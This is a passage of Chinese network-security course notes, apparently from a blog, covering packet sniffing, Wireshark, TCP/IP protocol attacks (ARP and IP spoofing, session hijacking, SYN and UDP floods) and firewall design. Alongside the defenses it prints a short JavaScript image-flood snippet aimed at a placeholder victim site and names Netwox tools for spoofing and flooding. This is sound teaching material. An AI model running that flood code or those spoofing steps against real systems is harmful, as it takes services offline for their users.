Packet（通常就是链路层的数据帧去掉前面用于同步和标识帧开始的8字节和最后用于CRC校验的4字节）的具体内容，长度就是Caplen，这个长度的后面，就是当前PCAP文件中存放的下一个Packet数据包。PCAP文件里面并没有规定捕获的Packet数据包之间有什么间隔字符串，需要靠第一个Packet包确定下一组数据在文件中的起始位置。\n\n## 11.5 网络嗅探器软件\n\n- 类Unix平台网络嗅探器软件\n\n  –Libpcap抓包开发函数库\n\n  –Tcpdump以及wireshark嗅探器软件\n\n  –Snort、dsniff、sniffit和linux_sniffer…\n\n- Windows平台网络嗅探器软件\n\n  –NPF/winpcap/windump\n\n  –SnifferPro\n\n  –Buttsniffer、NetMon、Network Associates Sniffer\n\n### 11.5.1 Windows平台下的抓包技术\n\n- 内核本身没有提供标准的接口\n\n- 通过增加一个驱动程序或者网络组件来访问内核网卡驱动提供的数据包\n\n  –在Windows不同操作系统平台下有所不同\n\n- 不同sniffer采用的技术不同\n\n  –WinPcap是一个重要的抓包工具，它是libpcap的Windows版本\n\n#### 11.5.1.1 WinPcap\n\n- WinPcap包括三个部分\n\n  –第一个模块NPF(Netgroup Packet Filter)，是一个虚拟设备驱动程序文件。它的功能是过滤数据包，并把这些数据包原封不动地传给用户态模块，这个过程中包括了一些操作系统特有的代码\n\n  –第二个模块packet.dll为win32平台提供了一个公共的接口。不同版本的Windows系统都有自己的内核模块和用户层模块。Packet.dll用于解决这些不同。调用Packet.dll的程序可以运行在不同版本的Windows平台上，而无需重新编译\n\n  –第三个模块Wpcap.dll是不依赖于操作系统的。它提供了更加高层、抽象的函数。\n\n- packet.dll和Wpcap.dll\n\n  –packet.dll直接映射了内核的调用\n\n  –Wpcap.dll提供了更加友好、功能更加强大的函数调用\n\n{% asset_img winpcap组成.png winpcap组成 %}\n\n{% asset_img winpcap组成2.png winpcap组成2 %}\n\n- NPF在Windows网络结构中位置\n  - NDIS(Network Driver Interface Specification，网络驱动接口规范)描述了网络驱动与底层网卡之间的接口规范，以及它与上层协议之间的规范\n  - NPF作为一个核心驱动程序而提供的\n\n- WinPcap优势\n\n  - 提供了一套标准的抓包接口\n\n    ​\t–与libpcap兼容，可使得原来许多类UNIX平台下的网络分析工具快速移植过来\n\n    ​\t–便于开发各种网络分析工具\n\n  - 除了与libpcap兼容的功能之外，还有\n\n    ​\t–充分考虑了各种性能和效率的优化，包括对于NPF内核层次上的过滤器支持\n\n    ​\t–支持内核态的统计模式\n\n    ​\t–提供了发送数据包的能力\n\n## 11.6 网络嗅探的检测技术\n\n- 网卡和操作系统对于是否处于混杂模式会有一些不同的行为，利用这些特征可以判断一个机器是否运行在混杂模式下\n\n- 一些检测手段\n\n  –根据操作系统的特征\n\n  - Linux内核的特性：正常情况下，只处理本机MAC地址或者以太广播地址的包。在混杂模式下，许多版本的Linux内核只检查数据包中的IP地址以确定是否送到IP堆栈。因此，可以构造无效以太地址而IP地址有效的ICMP ECHO请求，看机器是否返回应答包(混杂模式)，或忽略(非混杂模式)。\n  - Windows 9x/NT：在混杂模式下，检查一个包是否为以太广播包时，只看MAC地址前八位是否为0xff。\n\n  –根据网络和主机的性能\n\n  - 根据响应时间：向本地网络发送大量的伪造数据包，然后，看目标主机的响应时间，首先要测得一个响应时间基准和平均值。\n\n## 11.7 网络嗅探技术的防范措施\n\n- 采用安全的网络拓扑\n\n  –共享式网络à交换式网络\n\n  –交换机上设置VLAN等技术手段，对网络进行合理的分段\n\n- 共享式以太网à交换式以太网拓扑\n\n  –性能提升: 广播冲突域à  每台主机单独冲突域\n\n  –安全性提升: 较难被网络监听\n\n  –交换式网络提供安全性仍可能被挫败: ARP欺骗\n\n- 静态ARP或者MAC-端口映射表代替动态机制\n- 重视网络数据传输的集中位置点的安全防范\n\n- 避免使用明文传输口令/敏感信息网络协议, 使用加密协议\n\n  –telnet->ssh\n\n  –IPSEC/TLS\n\n## 11.8 网络协议分析\n\n- 网络协议分析的粒度和层次\n\n  –原始数据包: 最细粒度、最低层次\n\n  –网络流(/会话): 通过5元组进行流(/会话)重组\n\n- 5元组: sip, sport, dip, dport, ipproto\n\n  –网络流高层统计\n\n  –IP会话列表<sip, sport>\n\n  - 目标端口流统计\\<dport>\n\n- 网络报文分析工具\n\n  –集成工具: Wireshark\n\n  –网络流重组: nstreams, snort\n\n  –高层统计和摘要分析: Netflow, RRDTools\n\n- 原始数据包粒度网络协议分析对网络上传输的二进制格式数据包进行解析，以恢复出各层网络协议信息以及传输内容的技术方法。\n\n{% asset_img 原始数据包粒度分析.png 原始数据包粒度分析 %}\n\n## 11.9 网络协议分析技术实现  \n\n- 实现参考源码\n\n  –Snort中的网络解码器模块\n\n  –decode.c/decode.h\n\n- 解析以太网数据帧 DecodeEthPkt\n\n  –预处理：拆包前进行一些前期处理\n\n  –拆包：将当前得到的包内存位置赋给Packet数据结构中相应的指针eh(EtherHdr)型的指针即可\n\n  –解析上层协议： switch语句，根据ether_type分别调用相应的上层协议解析例程\n\n{% asset_img DecodeEthPkt.png DecodeEthPkt %}\n\n## 11.10 Wireshark(ethereal)\n\n- Wireshark特性\n\n  –图形化界面/命令行(tshark)\n\n  –在线/离线抓包(支持标准pcap二进制日志文件)\n\n  –支持BPF过滤器\n\n  –支持分析几百种常见网络协议\n\n  –跨平台：类UNIX、Win32(依赖libpcap/WinPcap)\n\n### 11.10.1 Wireshark基本功能  \n\n- 抓包(Capture)\n\n  –Capture Filter: BPF过滤器\n\n- 分析(Analyze)\n\n  –自动协议解码: 支持数百种协议, 显示各层包头和内容字段\n\n  –灵活选择协议对网络流进行解码Decode As…\n\n- 统计(Statistics)\n\n  –协议分类(Protocol Hierarchy)\n\n  –会话列表(Conversations)\n\n  - 2层(以太网)/3层(IP)/4层(TCP,UDP)\n\n  –会话终端(EndPoints)\n\n  –I/O Graph: 随时间统计的流量曲线\n\n  –会话重组(Follow TCP/UDP Stream)(Flow Graph)\n\n### 11.10.2 Wireshark中的两类过滤规则\n\n- 嗅探过滤规则\n\n  –支持BPF规则\n\n  –用于嗅探抓包时的过滤\n\n- 显示过滤规则\n\n  –用于在界面中选择显示哪些数据包\n\n  –与BPF规则有所不同\n\n## 11.11 流重组/会话重组\n\n- 流重组/会话重组\n\n  –TCP/UDP会话发送字节数可能很大\n\n  –IP包最大长度(64K-20≈64K)\n\n  –以太网帧最大长度(1500-20=1480)\n\n  –协议栈发送大量TCP/UDP报文时，必然分组传送\n\n  –流重组: 将同属于一个TCP/UDP会话的IP包负载按序重新组装，还原应用层数据的过程\n\n- 流重组工具\n\n  –Wireshark: Follow TCP/UDP Stream\n\n  –nstreams:\n\n  - nstreams -f pcap_file > nstreams.txt\n\n  –Snort:\n\n  - Log规则(snort.conf): log tcp any any <> any any (sid:1000001; session: printable;)\n\n  - snort -r pcap_file –l ./log -csnort.conf\n\n## 11.12 网络流记录和高层统计分析\n\n- Netflow\n\n  –定义了网络会话流记录的业界标准-Cisco\n\n- RFC 3334/3954/3955\n\n  –IP Flow Information Export (netflowv10)-IETF\n\n- 网络流记录\n\n  –商业路由器、交换机支持Netflow日志输出\n\n  –开源软件: nfdump(支持Netflow标准), Argus\n\n- 网络流分析\n\n  –基于pcap文件上的流重组和统计分析\n\n- Wireshark: 协议分类/会话列表…\n\n- SnifferPro\n\n  –NetflowAnalyzer: HP openview/cacti/nfsen\n\n## 11.13 嗅探实例——网站指纹\n\n{% asset_img 网站指纹1.png 网站指纹1 %}\n\n{% asset_img 网站指纹2.png 网站指纹2 %}\n\n{% asset_img 网站指纹3.png 网站指纹3 %}\n\n# 12. TCP/IP网络协议攻击\n\n## 12.1 网络安全属性\n\n- 网络安全CIA属性\n\n  –保密性(Confidentiality)\n\n  –完整性(Integrity)\n\n  –可用性(Availability)\n\n- 其他三个补充属性\n\n  –真实性(Authentication)\n\n  –不可抵赖性(Non-Repudiation) \n\n  –可审查性(Accountability)\n\n## 12.2 网络攻击基本模式\n\n在 x. 800和 RFC 2828中使用的一种有用的安全攻击分类方法是被动攻击和主动攻击。\n\n### 12.2.1 被动攻击\n\n被动攻击试图从系统中学习或使用信息，但不影响系统资源。\n\n被动攻击的本质是窃听或监听传输。对手的目标是获取正在传输的信息。被动攻击有两种类型:\n\n+ 发布消息内容\n\n{% asset_img 窃听.png 窃听 %}\n\n+ 流量分析——监控流量，以确定通信主机的位置和身份，并可以观察交换消息的频率和长度\n\n{% asset_img 流量分析.jpg 流量分析 %}\n\n这些攻击很难发现，因为它们不涉及对数据的任何更改。\n\n### 12.2.2 主动攻击\n\n主动攻击包括修改数据流或创建虚假数据流，可以细分为4个类别: 伪装、重放、篡改消息和分布式拒绝服务攻击：\n\n- 把一个实体伪装成另一个实体\n\n{% asset_img 伪装.png 伪装 %}\n\n- 重播以前的讯息\n\n{% asset_img 重放.png 重放 %}\n\n- 修改/改变传输中的信息以产生未经授权的效果\n\n{% asset_img 篡改.png 篡改 %}\n\n- 分布式拒绝服务攻击——防止或抑制通讯设施的正常使用或管理\n\n{% asset_img 拒绝服务.png 拒绝服务 %}\n\n主动攻击呈现出与被动攻击相反的特征。虽然被动攻击很难被发现，但可以采取措施防止其成功。另一方面，由于潜在的物理、软件和网络漏洞种类繁多，要完全防止主动攻击是相当困难的。相反，我们的目标是检测主动攻击，并从它们造成的任何干扰或延迟中恢复。\n\n### 12.2.3 对攻击的一般处理原则\n\n- 被动攻击 – 侧重于阻止\n\n  --容易阻止\n\n  --难于检测\n\n- 主动攻击 – 侧重于检测与恢复\n\n  --难于阻止\n\n  --容易检测\n\n考虑安全服务的作用，可能需要什么。注意到两个的异同与传统的纸质文件，例如：\n\n- 有签名、日期；\n- 需要从披露的保护、篡改或销毁；\n- 可经公证和见证；\n- 可以记录或许可。 \n\n### 12.2.4 中间人攻击(MITM攻击)\n\n- 通信双方\n\n  –Alice & Bob\n\n- 中间人\n\n  –Mallory\n\n  –与通信双方建立起各自独立的会话连接\n\n  –对双方进行身份欺骗\n\n  –进行消息的双向转发\n\n  –必要前提：拦截通信双方的全部通信(截获)、转发篡改消息(篡改)、双方身份欺骗(伪造)\n\n  –现实世界中的中间人攻击–国际象棋欺骗术\n\n{% asset_img 中间人攻击.png 中间人攻击 %}\n\n## 12.3 安全缺陷与攻击技术\n\n{% asset_img 安全缺陷与攻击技术.png 安全缺陷与攻击技术 %}\n\n## 12.4 原始报文伪造技术及工具\n\n- 原始报文伪造技术\n\n  –伪造出特制的网络数据报文并发送\n\n  –原始套接字(Raw Socket)\n\n- Netwox/Netwag\n\n  –超过200个不同功能的网络报文生成与发送工具\n\n  –#netwoxnumber [parameters ... ]\n\n### 12.4.1 Netwox工具使用 \n\n- Netwox: 命令行\n\n- Netwag: 窗口, TCL支持\n\n- Wireshark捕获网络包\n\n- 工具32：伪造以太网包\n\n## 12.5 网络层协议攻击\n\n### 12.5.1 IP源地址欺骗\n\n- IP源地址欺骗\n\n  –伪造具有虚假源地址的IP数据包进行发送\n\n  –目的：隐藏攻击者身份、假冒其他计算机\n\n- IP源地址欺骗原理\n\n  –路由转发只是用目标IP地址，不对源做验证\n\n  –现实世界中的平信\n\n  –通常情况：无法获得响应包\n\n{% asset_img IP源地址欺骗.jpg IP源地址欺骗 %}\n\n- 假冒IP攻击\n\n  - 可以嗅探响应包的环境\n\n    ​\t–同一局域网\n\n    ​\t–ARP欺骗、重定向攻击劫持响应包\n\n  - 盲攻击(blind attack)\n\n    ​\t–Robert T. Morris在1985年提出\n\n    ​\t–Kevin Mitinick在1995年仍使用\n\n    ​\t–通过猜测TCP三次握手中所需的信息，假冒IP建立起TCP连接\n\n#### 12.5.1.1 TCP连接的基本信息\n\n五元组(srcip(源IP), srcport, dstip, dstport, proto)\n\n反映传输状态(seq, ack)\n\n#### 12.5.1.2 盲攻击过程\n\n{% asset_img 盲攻击过程.jpg 盲攻击过程 %}\n\n#### 12.5.1.3 IP源地址欺骗技术的应用场景\n\n- 普遍应用场景\n\n  –拒绝服务攻击：无需或不期望响应包，节省带宽，隐藏攻击源\n\n  –网络扫描(nmap -D)：将真正扫描源隐藏于一些欺骗的源IP地址中\n\n- 假冒IP攻击场景\n\n  –对付基于IP地址的身份认证机制\n\n  - 类Unix平台上的主机信任关系\n\n  - 防火墙或服务器中配置的特定IP访问许可\n\n  –远程主机IP欺骗-盲攻击，较难成功\n\n#### 12.5.1.4 利用Netwox进行IP源地址欺骗\n\n工具34/38\n\n#### 12.5.1.5 IP源地址欺骗的防范措施\n\n- 使用随机化的初始序列号以避免远程的盲攻击\n\n- 使用网络层安全传输协议如IPsec\n\n  –避免泄露高层协议可供利用的信息及传输内容\n\n- 避免采用基于IP地址的信任策略\n\n  –以基于加密算法的用户身份认证机制来替代\n\n- 在路由器和网关上实施包检查和过滤\n\n  –入站过滤机制(ingress filtering)\n\n  –出站过滤机制(egress filtering)\n\n### 12.5.2 ARP欺骗\n\n- ARP协议工作原理\n\n  –将网络主机的IP地址解析成其MAC地址\n\n  –①每台主机设备上都拥有一个ARP缓存(ARP Cache)\n\n  –②检查自己的ARP缓存，有，直接映射，无，广播ARP请求包\n\n  –③检查数据包中的目标IP地址是否与自己的IP地址一致，如一致，发送ARP响应，告知MAC地址\n\n  –④源节点在收到这个ARP响应数据包后，将得到的目标主机IP地址和MAC地址对映射表项添加到自己的ARP缓存中\n\n{% asset_img ARP协议.jpg ARP协议 %}\n\n#### 12.5.2.1 ARP欺骗攻击技术原理\n\nARP欺骗：发送伪造ARP消息，对特定IP所对应的MAC地址进行假冒欺骗，从而达到恶意目的。\n\n{% asset_img ARP欺骗.jpg ARP欺骗 %}\n\n- 网关ARP欺骗\n\n{% asset_img 网关ARP欺骗.png 网关ARP欺骗 %}\n\n#### 12.5.2.2 ARP欺骗技术的应用场景\n\n- 利用ARP欺骗进行交换网络中的嗅探\n\n- ARP欺骗构造中间人攻击，从而实施TCP会话劫持\n\n- ARP病毒\n\n- ARP欺骗挂马\n\n#### 12.5.2.3 利用Netwox进行ARP欺骗\n\n工具33\n\n#### 12.5.2.4 ARP欺骗攻击防范措施\n\n- 静态绑定关键主机的IP地址与MAC地址映射关系\n\n  –网关/关键服务器\n\n  –“arp -s IP地址 MAC地址类型\"\n\n- 使用相应的ARP防范工具\n\n  –ARP防火墙\n\n- 使用VLAN虚拟子网细分网络拓扑\n\n- 加密传输数据以降低ARP欺骗攻击的危害后果\n\n### 12.5.3 ICMP路由重定向攻击\n\n- ICMP路由重定向攻击\n\n  –伪装成路由器发送虚假的ICMP路由路径控制报文\n\n  –使受害主机选择攻击者指定的路由路径\n\n  –攻击目的：嗅探或假冒攻击\n\n- 技术原理\n\n  –路由器告知主机：“应该使用的路由器IP地址”\n\n{% asset_img ICMP路由重定向.png ICMP路由重定向 %}\n\n#### 12.5.3.1 ICMP路由重定向攻击技术\n\n- 攻击节点冒充网关IP，向被攻击节点发送ICMP重定向报文，并将指定的新路由器IP地址设置为攻击节点\n\n- 被攻击节点接受报文，选择攻击节点作为其新路由器(即网关)\n\n- 攻击节点可以开启路由转发，实施中间人攻击\n\n- “谎言还是真话”？\n\n#### 12.5.3.2 ICMP路由重定向攻击防范\n\n- 根据类型过滤一些ICMP数据包\n- 设置防火墙过滤\n- 对于ICMP重定向报文判断是不是来自本地路由器\n\n## 12.6 传输层协议攻击\n\n### 12.6.1 TCP RST攻击\n\n- 中断攻击\n\n  –伪造TCP重置报文攻击(spoofed TCP reset packet)\n\n  –TCP重置报文将直接关闭掉一个TCP会话连接\n\n  –限制条件：通讯目标方接受TCP包\n\n- 通讯源IP地址及端口号一致\n\n- 序列号(Seq)落入TCP窗口之内\n\n  –嗅探监视通信双方的TCP连接，获得源、目标IP地址及端口\n\n  –结合IP源地址欺骗技术伪装成通信一方，发送TCP重置报文给通信另一方\n\n- 应用场景：恶意拒绝服务攻击、重置入侵连接、GFW\n\n  –GFW: “net::ERR_CONNECTION_RESET”\n\n例：针对Google检索的 TCP RESET\n\np4-36-41\n\n### 12.6.2 TCP会话劫持\n\n- 结合嗅探、欺骗技术\n\n- 中间人攻击：注射额外信息，暗中改变通信\n\n- 计算出正确的 seq，ackseq 即可\n\n- TCP会话攻击工具\n\n  –Juggernaut、Hunt、TTY watcher、IP watcher\n\n{% asset_img TCP会话劫持.png TCP会话劫持 %}\n\n#### 12.6.2.1 Hunt工具介绍\n\n- 源码开放的自由软件，可运行在Linux平台上\n\n- 功能特点\n\n  –监听当前网络上的会话\n\n  –重置会话(reset a session)\n\n  –劫持会话\n\n  - 在劫持之后，使连接继续同步\n\n  –确定哪些主机在线\n\n  –四个守护进程\n\n  - 自动reset\n  - Arp欺骗包的转发\n  - 收集MAC地址\n  - 具有搜索功能的sniffer\n\n#### 12.6.2.2 会话劫持的防范措施\n\n- 避免攻击者成为通信双方的中间人\n\n  –部署交换式网络，用交换机代替集线器\n\n  –禁用主机上的源路由\n\n  –采用静态绑定IP-MAC映射表以避免ARP欺\n\n  –过滤ICMP重定向报文\n\n- TCP会话加密(IPsec协议)\n\n  –避免了攻击者在得到传输层的端口及序列号等关键信息\n\n- 防火墙配置\n\n  –限制尽可能少量的外部许可连接的IP地址\n\n- 检测\n\n  –ACK风暴：ACK包的数量明显增加\n\n### 12.6.3 TCP SYN Flood\n\n- 拒绝服务攻击(DoS)\n\n  –破坏可用性\n\n- TCP SYN Flood\n\n  –SYN洪泛攻击\n\n  –利用TCP三次握手协议的缺陷\n\n  –大量的伪造源地址的SYN连接请求\n\n  –消耗目标主机的连接队列资源\n\n  –不能够为正常用户提供服务\n\n{% asset_img TCPSYNFlood.png TCPSYNFlood %}\n\n{% asset_img TCPSYNFlood2.png TCPSYNFlood2 %}\n\n{% asset_img TCPSYNFlood3.png TCPSYNFlood3 %}\n\n#### 12.6.3.1 利用Netwox进行TCP SYN Flood\n\n工具76\n\n#### 12.6.3.2 SYN Flood攻击防范措施-SynCookie\n\n- 弥补TCP连接建立过程资源分配这一缺陷\n\n- 无状态的三次握手\n\n  –服务器收到一个SYN报文后,不立即分配缓冲区\n\n  –利用连接的信息生成一个cookie, 作为SEQ\n\n  –客户端返回ACK中带着ACK = cookie+1\n\n  –服务器端核对cookie, 通过则建立连接，分配资源\n\n{% asset_img SYNFlood防范措施.jpg SYNFlood防范措施 %}\n\n- 有状态防火墙\n\n  –网络中的TCP连接进行状态监控和处理\n\n  –维护TCP连接状态：NEW状态、GOOD状态、BAD状态…\n\n  –三次握手‖代理\n\n{% asset_img 防火墙地址状态监控技术.png 防火墙地址状态监控技术 %}\n\n### 12.6.4 UDP Flood攻击\n\n- UDP协议\n\n  –无状态不可靠\n\n  –仅仅是传输数据报\n\n- UDP Flood\n\n  –带宽耗尽型拒绝服务攻击\n\n  –分布式拒绝服务攻击(DDoS)\n\n  –利用僵尸网络控制大量受控傀儡主机\n\n  –通常会结合IP源地址欺骗技术\n\n#### 12.6.4.1 UDP Flood攻击防范措施\n\n- 禁用或过滤监控和响应服务\n\n- 禁用或过滤其它的UDP 服务\n\n- 网络关键位置使用防火墙和代理机制来过滤掉一些非预期的网络流量\n\n- 遭遇带宽耗尽型拒绝服务攻击\n\n  –终端无能为力\n\n  –补救措施：网络扩容、转移服务器位置\n\n  –事件响应：汇报给安全应急响应部门、追溯和处置\n\n  –流量清洗解决方案：ISP为关键客户/服务所提供\n\n#### 12.6.4.2 另类DoS攻击\n\n##### 12.6.4.2.1 流量放大攻击\n\n- 对单个较小的UDP请求包回复以一个较大的UDP响应包的服务，可被用来放大 DOS 攻击\n- 攻击者伪造网络包，将其源地址设为受害者的 IP 地址，当服务产生响应时，大量的数据会发向受害者的地址。\n- 攻击者需要提供这类服务的大量地址以展开攻击，否则的话，受害者只需简单地丢弃来自这些少量地址的分组就能避免攻击。\n\n{% asset_img 流量放大攻击.png 流量放大攻击 %}\n\n常用的UDP放大器\n\n- DNS：ANY 查询将返回服务器所拥有的域的所有记录\n\n- NTP：MONLIST 返回最近询问时间的 600 个客户端\n\n时至今日，虽然两者都考虑过配置错误的问题, 但在Internet上，保存有十万计的错误配置主机。\n\n##### 12.6.4.2.2 Javascript-based DDoS 攻击\n\n- 简单的一段攻击代码attack.js\n\n```c\nfunction imgflood() {\n  var TARGET = 'victim-website.com'\n  var URI = '/index.php?'\n  var pic = new Image()\n  var rand = Math.floor(Math.random() * 1000)\n  pic.src = 'http://'+TARGET+URI+rand+'=val'\n}\nsetInterval(imgflood, 10)\n```\n\n场景1\n\n{% asset_img 场景一.png 场景一 %}\n\n场景2\n\n{% asset_img 场景二.png 场景二 %}\n\n场景3\n\n{% asset_img 场景三.png 场景三 %}\n\n解决方案\n\n{% asset_img 解决方案.png 解决方案 %}\n\n## 12.7 TCP/IP网络协议栈攻击防范措施\n\n### 12.7.1 监测、预防与安全加固\n\n- 网络接口层–主要安全威胁是网络嗅探\n\n  –局域网中的监听点检测\n\n  –网络设计上尽量细分和优化网络结构\n\n  –关键路径上的网关、路由器等设备的严格安全防护\n\n  –各类网络采用上层的加密通信协议\n\n- 互联层\n\n  –多种检测和过滤技术来发现和阻断网络中欺骗攻击\n\n  –增强防火墙、路由器和网关设备的安全策略(egress filtering)\n\n  –关键服务器使用静态绑定IP-MAC映射表、使用IPsec协议加密通讯等预防机制\n\n- 传输层：加密传输和安全控制机制(身份认证，访问控制)\n\n- 应用层：加密，用户级身份认证，数字签名技术，授权和访问控制技术以及主机安全技术如审计、入侵检测\n\n### 12.7.2 网络安全协议\n\n- 网络接口层\n\n  –无线：WPA/WPA2\n\n  –统一认证：802.1X\n\n- 网络互联层\n\n  –IPsec协议簇\n\n  –AH协议：完整性、认证、抗重放攻击\n\n  –ESP协议：机密性、数据源验证、抗重放、完整性\n\n- 传输层\n\n  –TLS/SSL: 加密、可靠\n\n- 应用层\n\n  –HTTPS、S/MIME、SET\n\n{% asset_img 网络安全协议.png 网络安全协议 %}\n\n# 13. 网络安全防护技术\n\n## 13.1 安全模型-P2DR模型\n\n### 13.1.1 信息安全技术与安全模型的发展\n\n- COMSEC –通信安全\n\n  –保护军事等机密信息，机密(Confidentiality)\n\n  –专门针对机密性的BLP(Bell-La Padula)多级安全策略模型\n\n- COMPSEC -计算机安全\n\n  –完整性(Integrity)也被纳入了核心安全属性\n\n  –引入身份认证、访问控制技术\n\n  –针对完整性保护的Biba模型和Clark-Wilson模型\n\n- NETSEC -网络安全\n\n  –网络信息服务的可用性(Availability)也上升成为核心的安全属性\n\n- IA –信息保障(NSA)\n\n  –机密性、完整性、可用性、真实性、不可抵赖性\n\n  –信息保障体系；纵深安全防护体系\n\n### 13.1.2 安全评估模型与标准\n\n- 安全评估\n\n  –评估信息系统是否能够满足特定的安全需求和属性\n\n- 安全评估模型\n\n  –1985：美国可信计算机安全评估准则TCSEC《桔皮书》\n\n- 分级评估：A\\B\\C\\D\n\n  –199x：欧洲ITSEC安全测评标准\n\n  –1999：Common Criteria(CC)标准\n\n  –1999：GB17859《计算机信息系统安全保护等级划分标准》\n\n- 静态安全模型VS. 动态安全模型(可适应安全模型)\n\n### 13.1.3 PDR安全模型\n\n- PDR: 基于时间的安全(Time-based Security)\n\n  –可以量化，可以计算\n\n  –防御延缓攻击时间，及时的检测和响应\n\nPDR的最基本的意思是，认为安全有三个不可或缺的功能要素：防护、检测、响应。\n\n{% asset_img PDR安全模型.png PDR安全模型 %}\n\nPt：整个防护体系的整体防护时间\n\nDt：检测时间\n\nRt：响应时间\n\n要达到安全，就要$Pt>Dt+Rt$\n\n### 13.1.4 P2DR安全模型\n\n美国ISS公司提出的动态网络安全体系的代表模型，也是动态安全模型的雏形。\n\n{% asset_img P2DR安全模型.jpg P2DR安全模型 %}\n\n网络安全是相对的，没有绝对的安全。\n\n根据风险分析制定安全策略(Policy)，PDR构成动态闭环。\n\n- P: 执行安全防护策略\n\n  防火墙、身份认证、访问控制、加密\n\n- D: 实时检测\n\n  漏洞评估、入侵检测\n\n- R: 实时响应\n\n  应急响应、备份恢复、灾难恢复\n\n## 13.2 P：防御技术\n\n- 网络防御-边界网络安全设备\n\n  –网络访问控制：防火墙，VPN\n\n  –网络内容控制：SCM\n\n  –IPS（入侵防御系统）, IMS(入侵管理系统), UTM（统一威胁管理）\n\n- 主机防御\n\n  –漏洞扫描和补丁管理\n\n  –个人防火墙\n\n  –防病毒软件\n\n  –系统诊断与恢复软件\n\n- 安全产业“老三样”: 防火墙、入侵检测、防病毒\n\n- 安全产业“新三样”: 安全管理平台、安全服务、个人安全防御\n\n### 13.2.1 防火墙(FireWall)\n\n- 防火墙是一项协助确保信息安全的设备，会依照特定的规则，允许或是限制传输的数据通过。\n- 置于不同的网络安全域之间，对网络流量或访问行为实施访问控制的安全组件或设备。\n- 大楼的“门卫”\n\n{% asset_img firewall.jpg firewall %}\n\n#### 13.2.1.1 防火墙技术关键特性\n\n- 只能对流经的网络数据进行检查控制：边界部署\n\n- 不具备主动检测网络攻击数据能力，需合理设计安全控制策略\n\n- 并非“一劳永逸”的“安全最终解决方案”\n\n#### 13.2.1.2 功能\n\n- 在网络协议栈的各个层次上实施网络访问控制机制\n\n  –网络层：包过滤\n\n  –传输层：电路级代理\n\n  –应用层：应用层代理/网关\n\n- 基本功能：控制在计算机网络中不同信任程度网络域间传送的数据流\n\n  –检查控制进出网络的网络流量\n\n  –防止脆弱或不安全的协议和服务\n\n  –防止内部网络信息的外泄\n\n  –对网络存取和访问进行监控审计\n\n  –防火墙可以强化网络安全策略并集成其他安全防御机制\n\n#### 13.2.1.3 不足\n\n- 作为网络边界防护机制而先天无法防范的安全威胁\n\n  –来自网络内部的安全威胁\n\n  –通过非法外联的网络攻击\n\n  –计算机病毒传播\n\n- 由于技术瓶颈问题目前还无法有效防范的安全威胁\n\n  –针对开放服务安全漏洞的渗透攻击\n\n  –针对网络客户端程序的渗透攻击\n\n  –基于隐蔽通道进行通信的特洛伊木马或僵尸网络\n\n#### 13.2.1.4 防火墙技术类型\n\n- 包过滤防火墙(packet filter)\n\n  –1988, DEC\n\n  –网络包粒度, 工作在网络层, 主要实现形式为路由器ACL\n\n- 状态防火墙(stateful firewall)\n\n  –1980s底, AT&T Bell\n\n  –网络会话粒度,工作在传输层\n\n  –目前防火墙最主要实现方式\n\n- 电路级代理技术\n\n- 应用层代理防火墙(application layer firewall)\n\n  –Paper: 1990 Purdue, AT&T\n\n  –Product: 1991 DEC\n\n  –应用层代理，工作在应用层\n\n{% asset_img OSI模型.png OSI模型 %}\n\n##### 13.2.1.4.1 包过滤防火墙\n\n- 基本的思想很简单\n\n  –对于每个进来的包，适用一组规则，然后决定转发或者丢弃该包\n\n  –往往配置成双向的\n\n- 如何过滤\n\n  –过滤的规则以IP和传输层的头中的域(字段)为基础，包括源和目标IP地址、IP协议域、源和目标端口号\n\n  –过滤器往往建立一组规则，根据IP包是否匹配规则中指定的条件来作出决定。\n\n  –如果匹配到一条规则，则根据此规则决定转发或者丢弃\n\n  –如果所有规则都不匹配，则根据缺省策略\n\n- 根据定义好的过滤规则审查每个数据包，过滤规则基于数据包的报头信息进行制订。\n\n- 报头信息中包括IP源地址、IP目标地址、传输协议(TCP、UDP、ICMP等等)、TCP/UDP目标端口、ICMP消息类型等\n\n{% asset_img 包过滤防火墙.png 包过滤防火墙 %}\n\n- 通常在路由器上实现\n\n  –实际上是一种网络层的访问控制机制\n\n  –路由器ACL机制\n\n- 在网络层上进行监测\n\n  –仅仅根据数据包自身包含的信息(协议头部)进行检查和过滤\n\n  –并没有考虑连接状态信息\n\n- 优点：\n\n  –实现简单\n\n  –对用户透明\n\n  –效率高\n\n- 缺点：\n\n  –正确制定规则并不容易\n\n  –不可能引入认证机制\n\n##### 13.2.1.4.2 状态防火墙\n\n- 状态防火墙\n\n  –跟踪网络会话(连接)状态, 判断报文合法性\n\n  –在网络会话粒度上匹配和实施防火墙规则\n\n  –特性: 状态报文检查(SPI: stateful packet inspection)\n\n{% asset_img 状态防火墙.png 状态防火墙 %}\n\n- 状态防火墙机制\n\n  –跟踪和维护网络连接状态信息(CT: connection table)\n\n  –TCP网络连接\n\n  - SYN包: NEW connections\n  - 经过三次握手: ESTABLISHED connections\n\n  –UDP会话\n\n  - 一般处理UDP包时, 马上设置为ESTABLISHED\n\n  –在网络访问配置规则中支持对状态的匹配\n\n- 目前防火墙产品的主流应用技术\n\n  –国外厂商: Check Point/Cisco/ FORTINET/Juniper…\n\n  –国内厂商: 天融信/联想/方正/…\n\n  –开源软件: Netfilter\\*/IPTables* (Linux)\n\n#### 13.2.1.5 防火墙产品\n\n- 防火墙产品类别\n\n  –集成包过滤功能的路由器\n\n  –基于通用操作系统的防火墙软件产品\n\n  –软件防火墙\n\n  –基于安全操作系统的防火墙\n\n  –软件防火墙+硬件Box\n\n  –硬件防火墙设备\n\n  –硬件防火墙\n\n- 个人防火墙\n\n  –Windows个人防火墙\n\n  –天网防火墙\n\n  –360安全卫士/瑞星\n\n#### 13.2.1.6 防火墙部署方法\n\n- 包过滤路由器\n\n- 双宿主堡垒主机\n\n- 屏蔽主机\n\n- 屏蔽子网\n\n- 几个基本概念\n\n  –堡垒主机(Bastion Host)：对外部网络暴露，同时也是内部网络用户的主要连接点\n\n  –双宿主主机(dual-homed host)：至少有两个网络接口的通用计算机系统\n\n  –DMZ(Demilitarized Zone，非军事区或者停火区)：在内部网络和外部网络之间增加的一个子网\n\n##### 13.2.1.6.1 包过滤路由器部署方案\n\n- 包过滤防火墙功能的路由器\n\n  –内部网络和外部网络之间的唯一连接点\n\n  –路由+ACL\n\n- 优势\n\n  –成本低、易于使用\n\n- 缺点\n\n  –一旦路由器被攻破，内网完全暴露\n\n  –内部网络信息对外公开，可攻击开放的主机和服务\n\n{% asset_img 包过滤路由器.png 包过滤路由器 %}\n\n##### 13.2.1.6.2 双宿主堡垒主机部署方案\n\n- 